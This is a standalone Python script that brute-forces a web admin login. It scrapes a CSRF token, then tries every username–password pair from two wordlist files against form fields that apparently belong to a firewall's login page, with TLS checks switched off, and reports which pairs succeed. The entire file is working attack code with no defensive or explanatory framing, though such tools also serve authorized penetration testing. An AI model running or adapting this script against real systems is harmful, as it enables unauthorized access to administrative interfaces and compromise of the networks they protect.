#!/bin/python3

from requests import Session
from requests.packages.urllib3 import disable_warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re
import itertools

disable_warnings(InsecureRequestWarning)

CSRF_TOKEN_URL = 'https://127.0.0.1/index.php'
CSRF_TOKEN_PATTERN = r'csrfMagicToken *= *"(.*?)"'
LOGIN_URL = 'https://127.0.0.1/index.php'
LOGIN_FAILED_FLAG = 'incorrect'

CSRF_TOKEN_PATTERN = re.compile(CSRF_TOKEN_PATTERN)

def login(username, password):
    with Session() as session:
        response = session.get(CSRF_TOKEN_URL, verify=False)
        csrf_token = CSRF_TOKEN_PATTERN.findall(response.text)
        assert(len(csrf_token) == 1)
        csrf_token = csrf_token[0]

        param = {
                '__csrf_magic': csrf_token,
                'usernamefld': username,
                'passwordfld': password,
                'login': 'Login'
        }

        response = session.post(LOGIN_URL, param)
        return LOGIN_FAILED_FLAG not in response.text


if __name__ == '__main__':
    with open('user.txt') as fd1, open('pass.txt') as fd2:
        for (username, password) in itertools.product(fd1, fd2):
            username = username.strip()
            password = password.strip()

            if login(username, password):
                print(f"{username}:{password} .. OK")
            else:
                print(f"{username}:{password} .. NG")


